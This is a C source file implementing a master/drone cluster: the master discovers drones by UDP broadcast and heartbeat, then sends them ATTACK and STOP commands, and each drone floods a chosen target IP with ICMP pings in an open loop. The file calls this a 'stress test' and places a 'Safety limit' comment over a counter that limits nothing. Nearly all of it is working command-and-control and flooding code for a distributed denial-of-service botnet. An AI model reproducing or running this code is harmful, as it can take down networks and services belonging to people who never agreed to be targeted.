#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>

#include "cluster.h"
#include "icmp_scanner.h"


// --- SHARED GLOBALS ---
static int sock_fd = -1;
static pthread_t attack_thread;
static int attack_active = 0;
static char current_target[INET_ADDRSTRLEN];

// --- HEARTBEAT ---
static char global_master_ip[INET_ADDRSTRLEN] = {0};
static int hb_active = 0;

void *heartbeat_thread(void *arg) {
    (void)arg;
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(CLUSTER_PORT);
    inet_pton(AF_INET, global_master_ip, &dest.sin_addr);

    cluster_packet_t pkt;
    pkt.magic = CLUSTER_MAGIC;
    pkt.cmd = CMD_HEARTBEAT;
    strcpy(pkt.sender_ip, "LINUX_DRONE");

    printf("DRONE: Heartbeat active -> %s\n", global_master_ip);

    while(hb_active) {
        sendto(sock_fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&dest, sizeof(dest));
        sleep(5);
    }
    return NULL;
}

// --- DRONE ATTACK LOGIC ---
void *drone_attack_worker(void *arg) {
    (void)arg;
    struct in_addr target;
    inet_pton(AF_INET, current_target, &target);
    
    printf("DRONE: Starting stress test on %s...\n", current_target);
    
    unsigned short id_base = (unsigned short)(pthread_self() & 0xFFFF);
    
    // Safety limit
    int packets = 0;
    while(attack_active) {
        ping_host(target, 50, id_base);
        usleep(10000); 
        packets++;
        if (packets % 100 == 0) printf("."); 
    }
    printf("\n");
    
    printf("DRONE: Attack stopped.\n");
    return NULL;
}

// --- DRONE SERVER ---
void run_drone_mode(const char *master_ip) {
    printf("=== NETWORK MAP DRONE AGENT ===\n");
    
    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_fd < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    int opt = 1;
    setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(CLUSTER_PORT);
    
    if (bind(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Bind failed");
        exit(1);
    }
    
    printf("Info: Listening on UDP %d\n", CLUSTER_PORT);

    if (master_ip && strlen(master_ip) > 0) {
        strcpy(global_master_ip, master_ip);
        hb_active = 1;
        pthread_t tid;
        pthread_create(&tid, NULL, heartbeat_thread, NULL);
    }
    
    cluster_packet_t pkt;
    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);
    
    while(1) {
        int len = recvfrom(sock_fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sender, &sender_len);
        if (len > 0) {
            if (pkt.magic != CLUSTER_MAGIC) continue;
            
            if (pkt.cmd == CMD_DISCOVERY) {
                printf("Cmd: DISCOVERY from %s\n", inet_ntoa(sender.sin_addr));
                
                cluster_packet_t reply;
                reply.magic = CLUSTER_MAGIC;
                reply.cmd = CMD_OFFER;
                strcpy(reply.sender_ip, "MY_IP"); 
                
                sendto(sock_fd, &reply, sizeof(reply), 0, (struct sockaddr *)&sender, sender_len);
            }
            else if (pkt.cmd == CMD_ATTACK) {
                printf("Cmd: ATTACK Target=%s\n", pkt.target_ip);
                
                if (attack_active) {
                    attack_active = 0;
                    pthread_join(attack_thread, NULL);
                }
                
                strcpy(current_target, pkt.target_ip);
                attack_active = 1;
                pthread_create(&attack_thread, NULL, drone_attack_worker, NULL);
            }
            else if (pkt.cmd == CMD_STOP) {
                 printf("Cmd: STOP\n");
                 if (attack_active) {
                    attack_active = 0;
                    pthread_join(attack_thread, NULL);
                }
            }
        }
    }
}

// --- MASTER CLIENT ---

#define MAX_DRONES 64
static char drone_list[MAX_DRONES][INET_ADDRSTRLEN];
static int drone_count = 0;
static int master_sock = -1;
static pthread_t server_tid;
static int server_running = 0;

void add_drone_safe(const char *ip) {
    for(int i=0; i<drone_count; i++) {
        if (strcmp(drone_list[i], ip) == 0) return; // Exists
    }
    if (drone_count < MAX_DRONES) {
        strcpy(drone_list[drone_count], ip);
        drone_count++;
        printf("CLUSTER: New Drone Registered -> %s\n", ip);
    }
}

void *master_listener_func(void *arg) {
    (void)arg;
    cluster_packet_t pkt;
    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);

    printf("CLUSTER: Master Listener Thread Started (Port %d)\n", CLUSTER_PORT);

    while(server_running) {
        int len = recvfrom(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sender, &sender_len);
        if (len > 0) {
             if (pkt.magic == CLUSTER_MAGIC) {
                 // Handle Responses
                 if (pkt.cmd == CMD_OFFER || pkt.cmd == CMD_HEARTBEAT) {
                      char *ip = inet_ntoa(sender.sin_addr);
                      add_drone_safe(ip);
                 }
             }
        }
    }
    return NULL;
}

void init_cluster_manager() {
    master_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int broadcast = 1;
    setsockopt(master_sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    
    // Reuse Addr to avoid conflict if we restart strict
    int opt = 1;
    setsockopt(master_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(CLUSTER_PORT);

    if (bind(master_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        // If we can't bind 7123, maybe another instance (drone) is running?
        // We can still send commands but we won't receive Heartbeats well on same port.
        // But Master needs to listen.
        perror("CLUSTER: Failed to bind Master Port 7123");
    }

    server_running = 1;
    pthread_create(&server_tid, NULL, master_listener_func, NULL);
}

void discover_drones() {
    // Send Broadcast WHOIS to LAN (Legacy)
    struct sockaddr_in bcast;
    memset(&bcast, 0, sizeof(bcast));
    bcast.sin_family = AF_INET;
    bcast.sin_addr.s_addr = INADDR_BROADCAST;
    bcast.sin_port = htons(CLUSTER_PORT);
    
    cluster_packet_t pkt;
    pkt.magic = CLUSTER_MAGIC;
    pkt.cmd = CMD_DISCOVERY;
    
    sendto(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&bcast, sizeof(bcast));
    printf("CLUSTER: Broadcast Discovery sent (Waiting for replies/heartbeats...)\n");
}

void send_cluster_attack(const char *target_ip) {
    cluster_packet_t pkt;
    pkt.magic = CLUSTER_MAGIC;
    pkt.cmd = CMD_ATTACK;
    strcpy(pkt.target_ip, target_ip);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLUSTER_PORT);
    
    for(int i=0; i<drone_count; i++) {
        inet_pton(AF_INET, drone_list[i], &addr.sin_addr);
        sendto(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    printf("CLUSTER: Sent ATTACK to %d drones\n", drone_count);
}

void stop_cluster_attack() {
    cluster_packet_t pkt;
    pkt.magic = CLUSTER_MAGIC;
    pkt.cmd = CMD_STOP;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLUSTER_PORT);
    
    for(int i=0; i<drone_count; i++) {
        inet_pton(AF_INET, drone_list[i], &addr.sin_addr);
        sendto(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr, sizeof(addr));
    }
}

int get_drone_count() {
    return drone_count;
}
